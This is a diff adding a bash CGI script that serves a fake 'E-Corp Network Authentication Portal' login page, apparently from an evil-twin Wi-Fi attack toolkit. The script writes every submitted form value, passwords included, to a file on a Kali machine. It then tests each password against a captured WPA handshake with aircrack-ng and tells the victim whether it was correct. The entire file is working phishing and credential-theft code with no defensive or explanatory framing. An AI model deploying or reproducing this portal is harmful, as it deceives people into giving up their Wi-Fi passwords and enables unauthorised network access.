@@ -1,0 +1,63 @@
+#!/usr/bin/env bash
+echo '<!DOCTYPE html>'
+echo '<html>'
+echo -e '\t<head>'
+echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+echo -e '\t\t<title>E-Corp Network Authentication Portal</title>'
+echo -e '\t\t<link rel="stylesheet" type="text/css" href="portal.css"/>'
+echo -e '\t\t<script type="text/javascript" src="portal.js"></script>'
+echo -e '\t</head>'
+echo -e '\t<body>'
+echo -e '\t\t<div class="content">'
+echo -e '\t\t\t<div class="form-box">'
+echo -e '\t\t\t\t<form method="post" id="loginform" name="loginform" action=""">'
+echo -e '\t\t\t\t\t<center><p>'
+POST_DATA=$(cat /dev/stdin)
+
+TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
+POST_DATA_D=$(printf '%b' "${POST_DATA//%/\\x}")
+echo "[${TIMESTAMP}] ${POST_DATA_D}" >>\
+"/home/kali/Desktop/passwords.txt"
+
+if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ "${CONTENT_LENGTH}" -gt 0 ]]; then
+pass_data=${POST_DATA#*password=}
+password=${pass_data/+/ }
+password=$(printf '%b' "${password//%/\\x}")
+fi
+
+if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
+rm -rf "/tmp/www/ag.et_currentpass.txt" > /dev/null 2>&1
+echo "${password}" >\
+"/tmp/www/ag.et_currentpass.txt"
+aircrack-ng -a 2 -b F8:E5:A4:3A:FA:81 -w "/tmp/www/ag.et_currentpass.txt" "/root/handshake-F8:E5:A4:3A:FA:81.cap" | grep "KEY FOUND!" > /dev/null
+if [ "$?" = "0" ]; then
+touch "/tmp/www/ag.et_success.txt" > /dev/null 2>&1
+echo 'The password is correct, the connection will be re-established in a few moments.'
+et_successful=1
+else
+echo "${password}" >>\
+"/tmp/www/ag.et_attempts.txt"
+echo 'The password entered is incorrect, redirecting to the main page.'
+et_successful=0
+fi
+elif [[ "${#password}" -gt 0 ]] && [[ "${#password}" -lt 8 ]]; then
+echo 'Error. Password must be at least 8 characters long. Redirecting to the main page.'
+et_successful=0
+else
+echo 'An unexpected error occurred, redirecting to the main page.'
+et_successful=0
+fi
+echo -e '\t\t\t\t\t</p></center>'
+echo -e '\t\t\t\t</form>'
+echo -e '\t\t\t</div>'
+echo -e '\t\t</div>'
+echo -e '\t</body>'
+echo '</html>'
+if [ "${et_successful}" -eq 1 ]; then
+exit 0
+else
+echo '<script type="text/javascript">'
+echo -e '\tsetTimeout("redirect()", 3500);'
+echo '</script>'
+exit 1
+fi
